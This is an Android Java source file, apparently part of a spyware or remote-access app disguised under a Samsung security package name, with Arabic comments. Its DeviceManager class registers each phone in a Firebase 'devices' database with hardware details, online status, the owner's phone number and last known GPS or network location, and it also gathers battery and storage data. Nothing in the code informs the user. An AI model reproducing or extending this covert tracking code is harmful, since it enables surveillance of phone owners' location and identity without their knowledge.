package com.samsung.android.security.v8.utils;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

/**
 * DeviceManager - إدارة معلومات الجهاز
 */
public class DeviceManager {
    
    private static final String TAG = "DeviceManager";
    
    /**
     * الحصول على معرف الجهاز الفريد
     */
    public static String getDeviceId(Context context) {
        try {
            String androidId = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            
            // تشفير المعرف
            return CryptoManager.sha256(androidId);
            
        } catch (Exception e) {
            Log.e(TAG, "Get device ID error: " + e.getMessage());
            return "unknown";
        }
    }
    
    /**
     * تسجيل الجهاز في Firebase
     */
    public static void registerDevice(Context context, String deviceId) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference devicesRef = database.getReference("devices").child(deviceId);
            
            Map<String, Object> deviceInfo = new HashMap<>();
            deviceInfo.put("deviceId", deviceId);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("product", Build.PRODUCT);
            deviceInfo.put("hardware", Build.HARDWARE);
            deviceInfo.put("registeredAt", System.currentTimeMillis());
            deviceInfo.put("lastSeen", System.currentTimeMillis());
            deviceInfo.put("status", "online");
            
            // الحصول على رقم الهاتف إذا متاح
            String phoneNumber = getPhoneNumber(context);
            if (phoneNumber != null && !phoneNumber.isEmpty()) {
                deviceInfo.put("phoneNumber", CryptoManager.encrypt(phoneNumber));
            }
            
            // الحصول على الموقع إذا متاح
            Location location = getLastLocation(context);
            if (location != null) {
                Map<String, Object> locationData = new HashMap<>();
                locationData.put("latitude", location.getLatitude());
                locationData.put("longitude", location.getLongitude());
                locationData.put("accuracy", location.getAccuracy());
                locationData.put("timestamp", location.getTime());
                deviceInfo.put("location", locationData);
            }
            
            devicesRef.setValue(deviceInfo);
            
            Log.d(TAG, "Device registered: " + deviceId);
            
        } catch (Exception e) {
            Log.e(TAG, "Device registration error: " + e.getMessage());
        }
    }
    
    /**
     * تحديث حالة الجهاز
     */
    public static void updateDeviceStatus(String deviceId, String status) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference deviceRef = database.getReference("devices").child(deviceId);
            
            Map<String, Object> updates = new HashMap<>();
            updates.put("status", status);
            updates.put("lastSeen", System.currentTimeMillis());
            
            deviceRef.updateChildren(updates);
            
        } catch (Exception e) {
            Log.e(TAG, "Status update error: " + e.getMessage());
        }
    }
    
    /**
     * الحصول على رقم الهاتف
     */
    private static String getPhoneNumber(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) 
                == PackageManager.PERMISSION_GRANTED) {
                String number = telephonyManager.getLine1Number();
                return (number != null && !number.isEmpty()) ? number : "";
            }
        } catch (Exception e) {
            Log.e(TAG, "Get phone number error: " + e.getMessage());
        }
        return "";
    }
    
    /**
     * الحصول على آخر موقع معروف
     */
    private static Location getLastLocation(Context context) {
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
                == PackageManager.PERMISSION_GRANTED) {
                
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                
                if (gpsLocation != null && networkLocation != null) {
                    return gpsLocation.getTime() > networkLocation.getTime() ? gpsLocation : networkLocation;
                }
                
                return gpsLocation != null ? gpsLocation : networkLocation;
            }
        } catch (Exception e) {
            Log.e(TAG, "Get location error: " + e.getMessage());
        }
        return null;
    }
    
    /**
     * الحصول على معلومات البطارية
     */
    public static Map<String, Object> getBatteryInfo(Context context) {
        Map<String, Object> batteryInfo = new HashMap<>();
        
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                float batteryPct = level * 100 / (float) scale;
                
                int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                                   status == android.os.BatteryManager.BATTERY_STATUS_FULL;
                
                batteryInfo.put("level", (int) batteryPct);
                batteryInfo.put("isCharging", isCharging);
                batteryInfo.put("temperature", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
                batteryInfo.put("voltage", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0));
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery info error: " + e.getMessage());
        }
        
        return batteryInfo;
    }
    
    /**
     * الحصول على معلومات التخزين
     */
    public static Map<String, Object> getStorageInfo(Context context) {
        Map<String, Object> storageInfo = new HashMap<>();
        
        try {
            android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());
            
            long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
            long bytesTotal = stat.getBlockSizeLong() * stat.getBlockCountLong();
            
            storageInfo.put("available", bytesAvailable);
            storageInfo.put("total", bytesTotal);
            storageInfo.put("used", bytesTotal - bytesAvailable);
            storageInfo.put("percentUsed", ((bytesTotal - bytesAvailable) * 100.0 / bytesTotal));
            
        } catch (Exception e) {
            Log.e(TAG, "Storage info error: " + e.getMessage());
        }
        
        return storageInfo;
    }
}
